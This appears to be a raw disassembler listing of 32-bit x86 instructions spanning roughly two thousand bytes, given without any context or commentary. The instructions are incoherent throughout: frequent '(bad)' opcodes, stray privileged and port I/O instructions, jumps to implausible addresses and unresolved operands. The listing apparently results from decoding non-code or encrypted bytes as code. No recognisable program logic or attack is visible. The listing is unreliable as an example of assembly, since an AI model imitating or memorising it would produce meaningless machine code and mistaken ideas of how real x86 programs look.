  4094fd:	enter  0xc7c2,0x7b
  409501:	push   0x2f
  409503:	mov    al,ds:0x6fde0eda
  409508:	test   DWORD PTR [edx],0x1123d28b
  40950e:	jne    0x409583
  409510:	inc    ecx
  409511:	xor    edi,esi
  409513:	mov    ds:0x38f8ca5c,eax
  409518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409519:	add    al,0x9b
  40951b:	push   ds
  40951c:	or     DWORD PTR [ecx-0x15],eax
  40951f:	(bad)  
  409520:	cmp    eax,0x6292b217
  409525:	mov    al,0xb2
  409528:	jl     0x4094f9
  40952a:	je     0x4094cb
  40952c:	xchg   esp,eax
  40952d:	mov    eax,0xcab1af8c
  409532:	je     0x4094e2
  409534:	sbb    al,0x83
  409536:	(bad)  
  409537:	cmc    
  409538:	cmp    al,0x3d
  40953a:	cli    
  40953b:	and    DWORD PTR [eax+0x3e1805f3],esi
  409541:	test   DWORD PTR [edi],0xf4beb457
  409547:	and    cl,BYTE PTR [eax]
  409549:	push   ecx
  40954a:	int3   
  40954b:	sub    BYTE PTR [esp+0x5b895491],0x92
  409553:	es popa 
  409555:	and    al,0xfd
  409557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409558:	js     0x40950c
  40955a:	dec    ebp
  40955b:	in     al,0xa4
  40955d:	dec    esi
  40955e:	fnstsw WORD PTR [eax]
  409560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409561:	fnstsw WORD PTR ss:[edx-0x67]
  409565:	xor    dl,BYTE PTR [ebp-0xc448f86]
  40956b:	dec    esi
  40956c:	out    0xcb,al
  40956e:	scas   al,BYTE PTR es:[edi]
  40956f:	aad    0x4
  409571:	inc    ebx
  409572:	mov    ds:0x142c7973,eax
  409577:	mov    al,0x39
  409579:	outs   dx,DWORD PTR ds:[esi]
  40957a:	sahf   
  40957b:	mov    DWORD PTR [edx-0x7f38cf7c],esi
  409581:	xchg   ebp,eax
  409582:	(bad)  
  409583:	mov    eax,0xc29161a7
  409588:	ror    DWORD PTR [edi+0x5ca9f5fa],1
  40958e:	jae    0x40951e
  409590:	(bad)  
  409591:	pop    ss
  409592:	pop    edi
  409593:	repz fwait
  409595:	pop    edi
  409596:	adc    al,0x8c
  409598:	sub    BYTE PTR [eax+0x21],ah
  40959b:	jmp    0x74b64301
  4095a0:	scas   eax,DWORD PTR es:[edi]
  4095a1:	jb     0x4095c5
  4095a3:	in     eax,0x5c
  4095a5:	add    al,ch
  4095a7:	in     eax,dx
  4095a8:	mov    edx,0xb2e929f4
  4095ad:	pop    ds
  4095ae:	int    0x3f
  4095b0:	xchg   DWORD PTR [ecx-0x4ca1d7ad],ecx
  4095b6:	ins    DWORD PTR es:[edi],dx
  4095b7:	mov    WORD PTR [esi],?
  4095b9:	mov    edx,ebx
  4095bb:	aad    0xe4
  4095bd:	mov    ecx,0x559dad3
  4095c2:	jno    0x40956b
  4095c4:	or     bl,BYTE PTR [eax]
  4095c6:	(bad)  
  4095c7:	hlt    
  4095c8:	loop   0x40960f
  4095ca:	sbb    ah,BYTE PTR [edx-0x3dce51c9]
  4095d0:	rol    BYTE PTR [esi-0x8],cl
  4095d3:	repnz push esi
  4095d5:	ret    
  4095d6:	(bad)  
  4095d7:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d9:	test   eax,0x1deeb77b
  4095de:	mov    dh,0x29
  4095e0:	inc    edx
  4095e1:	jle    0x4095b7
  4095e3:	or     eax,0xb4645102
  4095e8:	fistp  WORD PTR [ebx]
  4095ea:	jle    0x4095e5
  4095ec:	sub    BYTE PTR [ecx+0x7682e03a],ch
  4095f2:	pop    ecx
  4095f3:	(bad)  
  4095f4:	ds test al,0xd9
  4095f7:	xchg   esp,eax
  4095f8:	out    dx,eax
  4095f9:	data16 test al,0xbc
  4095fc:	xchg   BYTE PTR [ebp+0x7229f298],cl
  409602:	xor    dl,bl
  409604:	aaa    
  409605:	jo     0x40967e
  409607:	xchg   ebp,eax
  409608:	add    DWORD PTR [ebx+eiz*4],ebx
  40960b:	xchg   DWORD PTR [esp+esi*8],esi
  40960e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40960f:	stos   BYTE PTR es:[edi],al
  409610:	pusha  
  409611:	add    ch,cl
  409613:	es push esp
  409615:	add    eax,0xd0ee5366
  40961a:	xchg   ebx,eax
  40961b:	lock fldcw WORD PTR [eax+0x33]
  40961f:	fidiv  WORD PTR [ebp-0x2a50b60]
  409625:	lahf   
  409626:	mov    edx,0xc6f71010
  40962b:	clc    
  40962c:	pop    ss
  40962d:	sti    
  40962e:	inc    ebp
  40962f:	push   ds
  409630:	inc    edx
  409631:	jo     0x40969b
  409633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409634:	popf   
  409635:	push   ecx
  409636:	outs   dx,BYTE PTR ds:[esi]
  409637:	popa   
  409638:	loop   0x4095d9
  40963a:	into   
  40963b:	xchg   ebx,eax
  40963c:	mov    ds:0x5c2807f8,eax
  409641:	out    dx,eax
  409642:	in     eax,0xe0
  409644:	pop    edx
  409645:	dec    edi
  409646:	stos   BYTE PTR es:[edi],al
  409647:	push   esi
  409648:	int3   
  409649:	adc    bh,bh
  40964b:	jmp    0x4096c9
  40964d:	adc    DWORD PTR [edi+0x64734adf],edx
  409653:	mov    ebx,0xe4694d91
  409658:	scas   al,BYTE PTR es:[edi]
  409659:	mov    al,0x77
  40965b:	aad    0x80
  40965d:	pusha  
  40965e:	je     0x409614
  409660:	fsub   DWORD PTR [ebx+0x44]
  409663:	clc    
  409664:	pop    edx
  409665:	mov    ch,0x76
  409667:	push   eax
  409668:	(bad)  
  40966a:	pop    ecx
  40966b:	pop    ebx
  40966c:	mov    ?,ecx
  40966e:	mov    eax,ds:0xbf046d6e
  409673:	sub    eax,0x5fac0843
  409678:	stos   DWORD PTR es:[edi],eax
  409679:	xor    DWORD PTR [eax+0x18dd4e5e],edx
  40967f:	lea    esi,[eax-0x4a]
  409682:	shl    DWORD PTR ds:0x6a0e89ed,cl
  409688:	pop    ecx
  409689:	add    al,dh
  40968b:	mov    ch,0x5e
  40968d:	adc    esp,DWORD PTR ds:0x11a9440d
  409693:	shl    BYTE PTR ds:0xe260ce6b,0xea
  40969a:	jae    0x40964c
  40969c:	inc    edi
  40969d:	enter  0xa1f2,0x76
  4096a1:	stos   BYTE PTR es:[edi],al
  4096a2:	loope  0x409637
  4096a4:	in     al,dx
  4096a5:	add    eax,DWORD PTR [ebp+0x221b4c9d]
  4096ab:	sbb    bh,BYTE PTR [edi+0x491a68e8]
  4096b1:	gs in  eax,dx
  4096b3:	(bad)  
  4096b4:	cld    
  4096b5:	aas    
  4096b6:	and    al,0x8f
  4096b8:	sbb    eax,0x43591440
  4096bd:	ficomp WORD PTR [edi+ebp*1-0x448a049b]
  4096c4:	(bad)  
  4096c6:	push   ds
  4096c7:	or     eax,0x9323c839
  4096cc:	xchg   ecx,eax
  4096cd:	ret    
  4096ce:	loop   0x4096dc
  4096d0:	scas   al,BYTE PTR es:[edi]
  4096d1:	push   ebx
  4096d2:	jne    0x4096f1
  4096d4:	(bad)  
  4096d5:	jb     0x409662
  4096d7:	(bad)  
  4096d8:	push   ebp
  4096d9:	stc    
  4096da:	inc    esp
  4096db:	xor    DWORD PTR [ebx+0x28],0xffffffce
  4096df:	enter  0xad72,0x9e
  4096e3:	fadd   QWORD PTR [ebx+0x4]
  4096e6:	xchg   edx,eax
  4096e7:	call   0x344541b2
  4096ec:	mov    ds:0xcbc67578,al
  4096f1:	pop    edx
  4096f2:	inc    ebx
  4096f3:	cmp    al,dl
  4096f5:	jl     0x409736
  4096f7:	iret   
  4096f8:	xchg   DWORD PTR [eax+edx*2],esp
  4096fb:	adc    eax,0x47d484e4
  409700:	cmp    eax,0x8436056b
  409705:	js     0x409759
  409707:	mov    ebx,DWORD PTR [esi-0x5e]
  40970a:	mov    ecx,0xa46ec538
  40970f:	add    al,al
  409711:	icebp  
  409712:	stos   DWORD PTR es:[edi],eax
  409713:	push   edi
  409714:	jmp    DWORD PTR [ebx+0x77]
  409717:	out    dx,eax
  409718:	push   es
  409719:	or     al,0x8b
  40971b:	push   esp
  40971c:	cmove  ecx,DWORD PTR [esi*1-0x798dfe6d]
  409724:	loopne 0x4096cd
  409726:	hlt    
  409727:	imul   ecx,ebx,0x8cdef9cd
  40972d:	mov    edx,0x41701f71
  409732:	sub    BYTE PTR [edx-0x69],bl
  409735:	mov    dh,0xe5
  409737:	inc    esp
  409738:	(bad)  
  409739:	lahf   
  40973a:	aad    0x90
  40973c:	push   esp
  40973d:	jl     0x4097b0
  40973f:	in     al,0x16
  409741:	mov    ds:0xccec0297,al
  409746:	test   BYTE PTR [edi-0x10afc3e5],0x6f
  40974d:	sub    al,0xa8
  40974f:	sar    BYTE PTR [edi+0x62],0x82
  409753:	data16 jo 0x409750
  409756:	sbb    eax,0xb447cbee
  40975b:	pop    edx
  40975c:	dec    eax
  40975d:	jg     0x4097ce
  40975f:	ja     0x4097a4
  409761:	sub    ecx,edi
  409763:	cmp    eax,esp
  409765:	scas   eax,DWORD PTR es:[edi]
  409766:	mov    bh,0x3f
  409768:	push   cs
  409769:	in     al,dx
  40976a:	dec    ebp
  40976b:	retf   
  40976c:	sbb    BYTE PTR [esi-0x3c980925],0xb8
  409773:	and    eax,0xffffff90
  409776:	jecxz  0x409737
  409778:	lods   al,BYTE PTR ds:[esi]
  409779:	retf   0x2f80
  40977c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40977d:	ins    BYTE PTR es:[edi],dx
  40977e:	jecxz  0x4097fe
  409780:	(bad)  
  409781:	xor    ebx,DWORD PTR [ecx-0xb94f7de]
  409787:	aam    0x6a
  409789:	jge    0x409757
  40978b:	imul   dl
  40978d:	ret    0x6f2b
  409790:	jg     0x4097c5
  409792:	fxam   
  409794:	sbb    ebp,ebp
  409796:	pop    ebx
  409797:	into   
  409798:	pop    esi
  409799:	inc    eax
  40979a:	xchg   ebp,eax
  40979b:	(bad)  
  40979d:	test   bh,bh
  40979f:	sub    ch,BYTE PTR [edi-0x67ac0fe8]
  4097a5:	and    BYTE PTR [eax-0x7d],cl
  4097a8:	bswap  edi
  4097aa:	popa   
  4097ab:	imul   edi,DWORD PTR [edi+0x490f7ae],0x43
  4097b2:	cmp    BYTE PTR [ebx+0x7ecc6313],0x7e
  4097b9:	in     al,dx
  4097ba:	aas    
  4097bb:	fwait
  4097bc:	sub    bl,BYTE PTR [ebp-0x6f]
  4097bf:	add    al,0x64
  4097c1:	dec    esi
  4097c2:	xor    BYTE PTR [esi],ch
  4097c4:	out    0x70,eax
  4097c6:	jns    0x4097e4
  4097c8:	lahf   
  4097c9:	or     DWORD PTR gs:[ebp-0x72],edi
  4097cd:	out    dx,al
  4097ce:	mov    dl,0xe
  4097d0:	bound  ebx,QWORD PTR [edi+ecx*8]
  4097d3:	mov    ds:0x908916e7,eax
  4097d8:	mov    DWORD PTR [edx-0x63],edi
  4097db:	or     ch,BYTE PTR [ebp-0x28]
  4097de:	fimul  WORD PTR [ecx+ebx*1-0x76152197]
  4097e5:	std    
  4097e6:	aas    
  4097e7:	mov    ebp,0xbaab6a46
  4097ec:	push   eax
  4097ed:	fwait
  4097ee:	mov    bh,0x61
  4097f0:	xor    eax,0x27f49329
  4097f5:	call   0xae2c27f3
  4097fa:	femms  
  4097fc:	mov    edi,0xd3c19c0f
  409801:	sbb    ch,cl
  409803:	push   ebp
  409804:	add    dh,BYTE PTR [ebx+0x17]
  409807:	je     0x4097c6
  409809:	loopne 0x40987e
  40980b:	out    0x40,al
  40980d:	xchg   ebx,eax
  40980e:	cmc    
  40980f:	jle    0x40988e
  409811:	mov    ah,0x67
  409813:	xor    eax,0x49764d09
  409818:	aad    0x71
  40981a:	adc    DWORD PTR [ebx+ebx*4+0x6ee4cbd6],edx
  409821:	sbb    esi,DWORD PTR [ecx+0x451ef5c1]
  409827:	out    0x5f,al
  409829:	or     cl,BYTE PTR [ebp+esi*2+0x41b20250]
  409830:	ror    ebx,1
  409832:	jne    0x409887
  409834:	mov    ax,ds:0xe6e05286
  40983a:	jns    0x4098a3
  40983c:	jnp    0x409832
  40983e:	jmp    DWORD PTR [edi+0x5d9fb05d]
  409844:	pop    es
  409845:	into   
  409846:	xor    al,bh
  409848:	inc    eax
  409849:	rcl    BYTE PTR [ebp-0xc330268],1
  40984f:	pop    ecx
  409850:	je     0x4098a8
  409852:	add    esi,DWORD PTR [ebp+0x71]
  409855:	or     ch,BYTE PTR [ebx]
  409857:	es mov ch,0x9b
  40985a:	mov    eax,0x59ec626f
  40985f:	or     BYTE PTR [eax+0x5e5d74c2],0x51
  409866:	sbb    esp,esi
  409868:	push   es
  409869:	aaa    
  40986a:	loop   0x4098ca
  40986c:	mov    WORD PTR [edx+0x76],fs
  40986f:	(bad)  
  409871:	xchg   bh,al
  409873:	shl    BYTE PTR [edi],cl
  409875:	push   esi
  409876:	mov    ds:0x398a0d19,al
  40987b:	in     al,0x35
  40987d:	lods   eax,DWORD PTR ds:[esi]
  40987e:	or     cl,BYTE PTR [eax-0x69]
  409881:	pop    es
  409882:	addr16 das 
  409884:	xchg   edx,eax
  409885:	jnp    0x409819
  409887:	mov    al,BYTE PTR [edx+eiz*4-0x65]
  40988b:	jno    0x409828
  40988d:	mov    eax,0xfd29ef6f
  409892:	mov    ebx,0x4ca00173
  409897:	mov    dh,0x5b
  409899:	sub    ebp,DWORD PTR [esi]
  40989b:	(bad)  
  40989c:	outs   dx,DWORD PTR ds:[esi]
  40989d:	dec    esi
  40989e:	in     eax,0x64
  4098a0:	retf   
  4098a1:	loop   0x40988f
  4098a3:	mov    al,ds:0xf99d7559
  4098a8:	bound  ebx,QWORD PTR [ebx-0x7b436188]
  4098ae:	in     eax,dx
  4098af:	inc    edi
  4098b0:	ins    DWORD PTR es:[edi],dx
  4098b1:	cmp    BYTE PTR [ebx],ch
  4098b3:	jns    0x40987c
  4098b5:	inc    ebp
  4098b6:	lock gs inc ecx
  4098b9:	dec    eax
  4098ba:	les    ecx,FWORD PTR [ecx]
  4098bc:	cmp    BYTE PTR [ebx-0x72],ch
  4098bf:	jbe    0x409892
  4098c1:	cmp    DWORD PTR [eax+0x2a],esp
  4098c4:	mov    esp,0x661fa0e
  4098c9:	sbb    edi,DWORD PTR [ecx]
  4098cb:	cmp    ebp,DWORD PTR [edx]
  4098cd:	xor    bh,BYTE PTR [ecx+0x62]
  4098d0:	or     BYTE PTR [edi+0x4ca21cbf],dl
  4098d6:	jecxz  0x409903
  4098d8:	out    dx,al
  4098d9:	sub    BYTE PTR [eax-0x4f],dh
  4098dc:	mov    ebp,0xac634e9d
  4098e1:	push   esp
  4098e2:	jmp    0xcb284b0
  4098e7:	xchg   DWORD PTR [ecx],esp
  4098e9:	dec    edi
  4098ea:	jle    0x409946
  4098ec:	pusha  
  4098ed:	add    cl,BYTE PTR [esi+edi*1+0x16e7ae7]
  4098f4:	outs   dx,DWORD PTR ds:[esi]
  4098f5:	(bad)  
  4098f6:	sbb    edx,DWORD PTR [ecx+0x1]
  4098f9:	pushf  
  4098fa:	sub    cl,bh
  4098fc:	mov    ebx,0xac633382
  409901:	jge    0x409956
  409903:	jns    0x40993c
  409905:	icebp  
  409906:	xchg   ebp,eax
  409907:	mov    ch,0x3b
  409909:	pop    ss
  40990a:	add    cl,cl
  40990c:	xchg   esp,eax
  40990d:	sti    
  40990e:	gs xchg esp,eax
  409910:	mov    esp,0x1bed862c
  409915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409916:	jle    0x40991b
  409918:	sbb    DWORD PTR [esp+edx*2],esi
  40991b:	adc    dh,cl
  40991d:	loop   0x409913
  40991f:	std    
  409920:	push   esp
  409921:	xor    ebp,ebp
  409923:	sub    al,0x76
  409925:	mov    ch,0xe9
  409927:	and    ah,BYTE PTR [edi]
  409929:	into   
  40992a:	rcr    DWORD PTR [ebx+0x21],0x19
  40992e:	leave  
  40992f:	jo     0x4098f7
  409931:	sub    ebx,edi
  409933:	(bad)  
  409934:	popf   
  409935:	int3   
  409936:	jae    0x409920
  409938:	or     al,0x2a
  40993a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40993b:	shr    DWORD PTR [edi-0x2f825b37],cl
  409941:	jl     0x4098f7
  409943:	cmp    BYTE PTR [edx],dh
  409945:	mov    esp,0xb0612ea8
  40994a:	mov    ebp,0x6d653e67
  40994f:	cld    
  409950:	fdiv   QWORD PTR gs:[esi+eiz*2]
  409954:	pop    es
  409955:	adc    DWORD PTR [esi],ebp
  409957:	mov    ch,0xe3
  409959:	rol    esi,1
  40995b:	xchg   BYTE PTR [ecx],ah
  40995d:	sub    dl,BYTE PTR [ecx+0x74]
  409960:	or     edi,DWORD PTR [ebx+0x283c301a]
  409966:	mov    ds:0x97e070af,al
  40996b:	xchg   ecx,eax
  40996c:	xchg   edi,eax
  40996d:	push   es
  40996e:	pop    ss
  40996f:	cli    
  409970:	sbb    BYTE PTR [ebp+0x69],dl
  409973:	xchg   ebx,eax
  409974:	mov    al,0xd7
  409976:	inc    esp
  409977:	mov    ebx,0x5d0c8846
  40997c:	adc    al,0x64
  40997e:	dec    esi
  40997f:	lds    edx,FWORD PTR [edi-0x38]
  409982:	dec    esp
  409983:	pop    ecx
  409984:	pushf  
  409985:	pop    ss
  409986:	std    
  409987:	and    bh,dh
  409989:	jns    0x409946
  40998b:	add    ebp,DWORD PTR ds:0xe7070ac
  409991:	sbb    al,0x7b
  409993:	std    
  409994:	nop
  409995:	lock outs dx,BYTE PTR ds:[esi]
  409997:	adc    ch,BYTE PTR [edx-0x5d]
  40999a:	sub    al,0x6b
  40999c:	in     eax,dx
  40999d:	xchg   ebp,eax
  40999e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40999f:	mov    DWORD PTR [ecx+0x1738fd4e],eax
  4099a5:	data16 scas al,BYTE PTR es:[edi]
  4099a7:	das    
  4099a8:	inc    eax
  4099a9:	inc    esi
  4099aa:	mov    edi,0x423fa98
  4099af:	push   esp
  4099b0:	cld    
  4099b1:	ret    
  4099b2:	std    
  4099b3:	cwde   
  4099b4:	mov    eax,ds:0xed00639a
  4099b9:	jbe    0x4099de
  4099bb:	je     0x4099ef
  4099bd:	sub    BYTE PTR ds:0x50a05c6f,al
  4099c3:	mov    ecx,0x3cdfdad
  4099c8:	lds    esp,FWORD PTR [eax+eax*2]
  4099cb:	sar    bl,0xad
  4099ce:	(bad)  [eax]
  4099d0:	dec    ebp
  4099d1:	scas   al,BYTE PTR es:[edi]
  4099d2:	lock sbb eax,edi
  4099d5:	in     eax,dx
  4099d6:	bound  edx,QWORD PTR [ecx]
  4099d8:	call   0x25cb1739
  4099dd:	jo     0x409a0a
  4099df:	xchg   BYTE PTR [edx-0x4dcfafee],ah
  4099e5:	inc    ebx
  4099e6:	sub    edx,esp
  4099e8:	test   BYTE PTR cs:[ecx],bh
  4099eb:	jb     0x4099b4
  4099ed:	jp     0x409a53
  4099ef:	loopne 0x409a0a
  4099f1:	in     al,dx
  4099f2:	add    al,0xde
  4099f4:	push   ebx
  4099f5:	sbb    DWORD PTR [edx],edi
  4099f7:	lahf   
  4099f8:	xchg   ebx,eax
  4099f9:	js     0x409a71
  4099fb:	sbb    eax,0x16d32aa
  409a00:	ins    DWORD PTR es:[edi],dx
  409a01:	cmp    eax,0x1f4356fa
  409a06:	pop    ss
  409a07:	shl    BYTE PTR [esp+ecx*2+0x1e129f3f],1
  409a0e:	mul    edx
  409a10:	idiv   DWORD PTR [ebx-0x7e]
  409a13:	cmp    ebx,ebx
  409a15:	pop    esp
  409a16:	pop    ebx
  409a17:	mov    eax,ds:0xcb208dea
  409a1c:	xor    edx,DWORD PTR [ecx+0x2b]
  409a1f:	cmp    edi,DWORD PTR [eax+0x6e]
  409a22:	sub    BYTE PTR [ebx],bl
  409a24:	bound  edx,QWORD PTR [ebp+0x6c]
  409a27:	cmp    al,0x4f
  409a29:	inc    ebp
  409a2a:	mul    DWORD PTR [esi]
  409a2c:	ins    DWORD PTR es:[edi],dx
  409a2d:	stc    
  409a2e:	das    
  409a2f:	test   BYTE PTR [esi-0x7d],ah
  409a32:	push   es
  409a33:	sbb    edi,DWORD PTR [eax+0x53]
  409a36:	ja     0x4099e9
  409a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a39:	add    ebx,ecx
  409a3b:	mov    ss,WORD PTR [esi-0x49]
  409a3e:	sub    bl,ch
  409a40:	cdq    
  409a41:	dec    edx
  409a42:	mov    edx,DWORD PTR [esi-0x11]
  409a45:	pop    edx
  409a46:	pop    edx
  409a47:	sar    BYTE PTR [edi-0x1f],cl
  409a4a:	xchg   esi,eax
  409a4b:	or     bh,ch
  409a4d:	pop    ebx
  409a4e:	dec    edi
  409a4f:	jg     0x4099e6
  409a51:	out    0x1b,al
  409a53:	sbb    bl,BYTE PTR [edi-0x3]
  409a56:	out    0xaa,eax
  409a58:	retf   
  409a59:	or     ah,dh
  409a5b:	cmp    al,0xd2
  409a5d:	js     0x409a51
  409a5f:	or     eax,0x8dc489ec
  409a64:	mul    DWORD PTR [ecx]
  409a66:	or     al,0x6b
  409a68:	mov    dl,0xa3
  409a6a:	adc    DWORD PTR [ebx+0xed38abd],edi
  409a70:	mov    esi,0xd9bfb779
  409a75:	push   ds
  409a76:	pop    ebp
  409a77:	pop    es
  409a78:	outs   dx,BYTE PTR ds:[esi]
  409a79:	sub    ebp,DWORD PTR [eax+0x137f5a54]
  409a7f:	imul   DWORD PTR [ebx]
  409a81:	bound  ebx,QWORD PTR [ecx+0x73]
  409a84:	xchg   BYTE PTR [edi+0x24],ah
  409a87:	or     al,0x8d
  409a89:	sahf   
  409a8a:	sbb    DWORD PTR [eax],edi
  409a8c:	loopne 0x409a7a
  409a8e:	fdiv   QWORD PTR [ecx-0x15]
  409a91:	push   ebp
  409a92:	or     al,BYTE PTR [ecx-0x7c]
  409a95:	test   bh,dl
  409a97:	in     eax,dx
  409a98:	and    ebp,ebx
  409a9a:	sti    
  409a9b:	inc    ebp
  409a9c:	and    al,0xfd
  409a9e:	mov    edx,0xd8b8b605
  409aa3:	nop
  409aa4:	shl    BYTE PTR [edx],cl
  409aa6:	lock and dl,ch
  409aa9:	pusha  
  409aaa:	or     bh,ch
  409aac:	xor    eax,0x3ab41203
  409ab1:	cmp    DWORD PTR fs:0x4eae46b0,esi
  409ab8:	js     0x409aef
  409aba:	dec    ecx
  409abb:	xchg   BYTE PTR [edi-0x76d44f7b],al
  409ac1:	pop    esi
  409ac2:	and    edx,DWORD PTR [eax]
  409ac4:	mov    edx,0xc812907b
  409ac9:	inc    ebp
  409aca:	ins    DWORD PTR es:[edi],dx
  409acb:	mov    ebx,0x468fa031
  409ad0:	jae    0x409b50
  409ad2:	leave  
  409ad3:	push   cs
  409ad4:	aaa    
  409ad5:	(bad)  
  409ad6:	arpl   dx,bp
  409ad8:	inc    edx
  409ad9:	bound  ebp,QWORD PTR [esp+eax*4]
  409adc:	dec    edx
  409add:	cmp    esi,DWORD PTR [esi]
  409adf:	imul   esp,DWORD PTR [ebx+edx*4+0x1837aa59],0x10e3fcef
  409aea:	adc    DWORD PTR [eax],ebp
  409aec:	jb     0x409b4f
  409aee:	(bad)  
  409aef:	(bad)  
  409af0:	xchg   DWORD PTR [ebx],esi
  409af2:	addr16 hlt 
  409af4:	or     al,0xe3
  409af6:	jp     0x409b01
  409af8:	popa   
  409af9:	in     al,0x27
  409afb:	mov    esi,0x6257e20d
  409b00:	outs   dx,DWORD PTR ds:[esi]
  409b01:	pop    ss
  409b02:	fld    DWORD PTR [eax+0x3febb28b]
  409b08:	repnz and DWORD PTR [ecx],ebp
  409b0b:	push   ecx
  409b0c:	fiadd  DWORD PTR [eax]
  409b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0f:	xor    esp,ecx
  409b11:	jno    0x409aff
  409b13:	retf   0x2015
  409b16:	inc    eax
  409b17:	bound  edx,QWORD PTR [eax+0x3f284721]
  409b1d:	mov    dl,BYTE PTR [edi+0x31c57ebf]
  409b23:	mov    DWORD PTR [edi-0x4dd3d04],esi
  409b29:	sbb    DWORD PTR [edi+0x17],ecx
  409b2c:	call   0x89f5:0x67c983d7
  409b33:	std    
  409b34:	pop    edx
  409b35:	imul   edi,esi,0x11c6d563
  409b3b:	jp     0x409b67
  409b3d:	push   esp
  409b3e:	outs   dx,BYTE PTR ds:[esi]
  409b3f:	dec    ecx
  409b40:	sub    BYTE PTR [ecx],bh
  409b42:	jno    0x409b45
  409b44:	fistp  QWORD PTR [ecx+esi*2]
  409b47:	lahf   
  409b48:	out    dx,eax
  409b49:	lahf   
  409b4a:	int3   
  409b4b:	mov    bl,0x40
  409b4d:	xchg   DWORD PTR [edx-0x6575382b],ebp
  409b53:	shl    DWORD PTR [ebp+0x2a1374f2],1
  409b59:	cmp    esp,esi
  409b5b:	jb     0x409bbc
  409b5d:	jmp    0x409b3a
  409b5f:	pop    ebx
  409b60:	imul   esi,DWORD PTR [esi],0xd3db54e6
  409b66:	stos   BYTE PTR es:[edi],al
  409b67:	jns    0x409bba
  409b69:	loop   0x409b2d
  409b6b:	mov    al,ds:0x96b42af6
  409b70:	add    eax,0x86d67143
  409b75:	adc    dh,BYTE PTR [edx]
  409b77:	mov    ds:0x53b3243d,eax
  409b7c:	dec    edi
  409b7d:	ins    BYTE PTR es:[edi],dx
  409b7e:	add    eax,DWORD PTR [edi+0x49cff3a6]
  409b84:	lds    esp,FWORD PTR [esi-0x56]
  409b87:	in     al,0x2b
  409b89:	push   ecx
  409b8a:	xchg   ebp,eax
  409b8b:	xor    ebx,eax
  409b8d:	test   ah,cl
  409b8f:	jo     0x409b11
  409b91:	push   0xc912b533
  409b96:	xchg   BYTE PTR ds:[ecx],ah
  409b99:	push   edx
  409b9a:	(bad)  
  409b9b:	mov    dl,0x9a
  409b9d:	enter  0x24cc,0xc3
  409ba1:	mov    ?,WORD PTR [ecx+0x25]
  409ba4:	fcomip st,st(0)
  409ba6:	jg     0x409c0f
  409ba8:	mov    eax,ds:0xfff14319
  409bad:	mov    eax,ds:0x338f9c6f
  409bb2:	(bad)  
  409bb3:	nop
  409bb4:	adc    al,0x10
  409bb6:	daa    
  409bb7:	add    al,0x54
  409bb9:	sub    eax,0xef27c853
  409bbe:	mov    ds:0xe5f0a789,al
  409bc3:	sbb    esi,DWORD PTR [ebp+0x4]
  409bc6:	ret    
  409bc7:	icebp  
  409bc8:	enter  0xeb,0x33
  409bcc:	cmp    eax,0x7981aebb
  409bd1:	lahf   
  409bd2:	and    DWORD PTR ds:0x1a14b3ac,esi
  409bd8:	retf   
  409bd9:	adc    DWORD PTR [ebp+0x3076200b],esi
  409bdf:	cmp    BYTE PTR [esi],0x8d
  409be2:	(bad)  
  409be3:	fstp   QWORD PTR [ebp+ebx*4+0x5229f4f0]
  409bea:	adc    al,0xb7
  409bec:	dec    esi
  409bed:	daa    
  409bee:	jle    0x409c03
  409bf0:	add    al,0x4c
  409bf2:	inc    ebp
  409bf3:	sar    DWORD PTR [esi+0x31],cl
  409bf6:	inc    ebp
  409bf7:	loope  0x409c04
  409bf9:	inc    ebx
  409bfa:	cmp    DWORD PTR [eax-0x15],ecx
  409bfd:	fnsave [edi-0x439df89e]
  409c03:	call   0xc292762d
  409c08:	mov    ecx,0xd3f10a01
  409c0d:	sbb    al,0xb1
  409c0f:	test   al,0xa2
  409c11:	push   0x47
  409c13:	ins    BYTE PTR es:[edi],dx
  409c14:	pop    eax
  409c15:	sbb    al,0xfc
  409c18:	cmp    DWORD PTR [edi+0x7],edi
  409c1b:	adc    DWORD PTR [esi-0x7e],eax
  409c1e:	mov    dh,0xc6
  409c20:	push   esi
  409c21:	xchg   edi,eax
  409c22:	fisttp WORD PTR [ebx-0x4c]
  409c25:	out    0xbb,al
  409c27:	adc    al,0x77
  409c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c2a:	cmp    ebp,ebp
  409c2c:	sub    esp,edi
  409c2e:	pop    edi
  409c2f:	cli    
  409c30:	fwait
  409c31:	push   ds
  409c32:	aad    0xe4
  409c34:	mov    bl,0x58
  409c36:	sar    BYTE PTR [ebx+0x32],1
  409c39:	and    ecx,ebp
  409c3b:	dec    eax
  409c3c:	getsec 
  409c3e:	add    BYTE PTR [esi],bl
  409c40:	inc    esp
  409c41:	loopne 0x409bf6
  409c43:	imul   ebp,DWORD PTR [edx+0x59],0x62a3b55b
  409c4a:	loopne 0x409c17
  409c4c:	fimul  DWORD PTR [ebp+0x72d9054f]
  409c52:	push   ecx
  409c53:	inc    ebp
  409c54:	pop    es
  409c55:	sar    BYTE PTR [edx-0x63],0x30
  409c59:	cli    
  409c5a:	call   0x5fd0c623
  409c5f:	mov    edx,0x12c5ed1
  409c64:	adc    ecx,ebx
  409c66:	jg     0x409c4e
  409c68:	in     eax,0x6c
  409c6a:	add    dh,dl
  409c6c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409c6e:	xchg   esp,eax
  409c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c70:	sub    DWORD PTR [edx-0x9],edi
  409c73:	push   ebx
  409c74:	jns    0x409c4e
  409c76:	add    esi,DWORD PTR [eax-0x6c]
  409c79:	div    ebp
  409c7b:	cdq    
  409c7c:	pop    ss
  409c7d:	and    eax,0xd897f6eb
  409c82:	mov    ebx,0xea49b869
  409c87:	sub    al,BYTE PTR [eax-0x2]
  409c8a:	retf   
  409c8b:	pop    esp
  409c8c:	jbe    0x409c68
  409c8e:	int3   
  409c8f:	pop    esi
  409c90:	push   0xfab80c11
